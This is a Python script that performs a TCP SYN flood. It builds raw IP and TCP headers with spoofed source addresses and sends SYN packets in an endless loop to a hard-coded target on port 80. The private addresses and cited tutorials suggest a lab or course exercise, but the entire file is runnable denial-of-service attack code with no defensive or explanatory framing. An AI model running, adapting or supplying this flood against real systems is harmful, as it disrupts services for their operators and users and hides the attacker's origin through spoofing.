#!/usr/bin/env python3
import socket
import struct
import random
import sys
import time
import signal

# EtherType for IPv4
ETH_P_IP = 0x0800

# Function to calculate TCP checksum
# Ref- “Calculation of TCP Checksum,” GeeksforGeeks, Mar. 30, 2020. https://www.geeksforgeeks.org/calculation-of-tcp-checksum/
def tcp_cheksum(source_ip, dest_ip, tcp_header, payload=b''):
    pseudo_header = struct.pack('!4s4sBBH',
        socket.inet_aton(source_ip),
        socket.inet_aton(dest_ip),
        0,  # Reserved
        socket.IPPROTO_TCP,  # Protocol (TCP)
        len(tcp_header) + len(payload)  # TCP length
    )
    combined_packet = pseudo_header + tcp_header + payload

    if len(combined_packet) % 2 != 0:
        combined_packet += b'\x00'  # Padding with zero byte if not even len

    cheksum = 0
    for i in range(0, len(combined_packet), 2):
        word = (combined_packet[i] << 8) + combined_packet[i + 1]
        cheksum += word
        cheksum &= 0xffffffff

    cheksum = (cheksum >> 16) + (cheksum & 0xffff)
    cheksum += (cheksum >> 16)
    cheksum = ~cheksum & 0xffff
    return cheksum

# Function to create a TCP SYN packet
def create_tcp_syn(source_ip, dest_ip, source_port, dest_port):
    # Ref - GeeksforGeeks, “TCP/IP Packet Format,” GeeksforGeeks, Sep. 11, 2023. https://www.geeksforgeeks.org/tcp-ip-packet-format/
    # TCP header fields
    #Choosing a random sequence number becuase sequence number is used to identify the order of the packets
    seq_num = random.randint(0, 0xffffffff)
    ack_num = 0
    data_offset = 5  # 5 * 4 = 20 bytes
    reserved = 0
    flags = 0x02  # SYN flag
    window_size = socket.htons(5840)
    urgent_pointer = 0

    tcp_header = struct.pack('!HHLLBBHHH',
        source_port,
        dest_port,
        seq_num,
        ack_num,
        (data_offset << 4) + reserved,
        flags,
        window_size,
        0, #checksum 0 initially
        urgent_pointer
    )

    cheksum = tcp_cheksum(source_ip, dest_ip, tcp_header)

    tcp_header = struct.pack('!HHLLBBHHH',
        source_port,
        dest_port,
        seq_num,
        ack_num,
        (data_offset << 4) + reserved,
        flags,
        window_size,
        cheksum,
        urgent_pointer
    )
    return tcp_header

# Function to create an IP header with spoofed source IP address
def create_ip_header(src_ip, dest_ip, tcp_header,payload=b''):
    version_iphl = (4 << 4) | 5  # IPv4 and IHL=5 (no options)
    tos = 0
    total_length = socket.htons(20 + len(tcp_header)+len(payload))  # IP header (20 bytes) + TCP header length
    identification = 0xFFFF
    flags_fragment_offset = 0
    ttl = 64
    protocol = socket.IPPROTO_TCP

    source_ip = socket.inet_aton(src_ip)
    destination_ip = socket.inet_aton(dest_ip)

    ip_header = struct.pack('!BBHHHBBH4s4s',
                            version_iphl,
                            tos,
                            total_length,
                            identification,
                            flags_fragment_offset,
                            ttl,
                            protocol,
                            0, #checksum 0 initially
                            source_ip,
                            destination_ip)
    return ip_header

# Exit on SIGINT (Ctrl+C)
def signal_handler(sig, frame):
    print("\nStopping attack......")
    sys.exit(0)

# Function to perform TCP SYN flooding attack with spoofed source IPs
def syn_flood(dest_ip, dest_port, spoofed_ips):
    try:
        # Creating raw socket
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
        # Tell the kernel not to add a IP header
        sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)

        print(f" Starting TCP SYN flood... Press Ctrl+C to stop.")

        while True:
            for ip in spoofed_ips:
                # Distinct source port numbers for each packet
                source_port = random.randint(1024, 65535)

                # Creating TCP SYN packet with spoofed source IP and randomized source port
                tcp_header = create_tcp_syn(ip, dest_ip, source_port, dest_port)

                # Creating an IP header with the spoofed source IP address and destination IP address
                ip_header = create_ip_header(ip, dest_ip, tcp_header)

                # Combining IP header and TCP header into a single packet
                packet = ip_header + tcp_header

                # Send the packet to the destination device and port
                sock.sendto(packet, (dest_ip, dest_port))
                print(f"Sent spoofed message from {ip}:{source_port} to {dest_ip}:{dest_port}")

            # adding delay between packets sending
            time.sleep(0.1)

    except KeyboardInterrupt:
        # Registering signal handler for Ctrl+C
        signal_handler(None, None)  

if __name__ == "__main__":
    # Registering signal handler for Ctrl+C
    signal.signal(signal.SIGINT, signal_handler)

    # The destination IP and port address of the target 
    dest_ip = "10.0.1.21"
    # Port 80
    dest_port = 0x50

    # List of spoofed source IP addresses that will act as amplifiers
    spoofed_source_ips = [
        "10.0.0.22",
        "10.0.0.21"
     ]

    syn_flood(dest_ip,dest_port ,spoofed_source_ips )